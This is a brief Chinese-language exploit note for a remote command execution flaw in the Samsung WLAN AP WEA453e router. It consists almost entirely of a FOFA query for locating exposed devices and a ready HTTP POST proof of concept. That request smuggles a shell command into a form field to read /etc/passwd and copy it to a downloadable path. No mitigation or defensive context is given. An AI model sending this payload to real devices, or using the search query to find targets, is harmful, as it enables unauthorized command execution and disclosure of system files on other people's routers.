# WLAN AP WEA453e路由器 远程命令执行漏洞

## 资产搜索
fofa title=="Samsung WLAN AP"

## POC
```shell
POST /(download)/tmp/a.txt HTTP/1.1
Host: xxx.xxx.xxx.xxx

command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
```
!()[img/rce.png]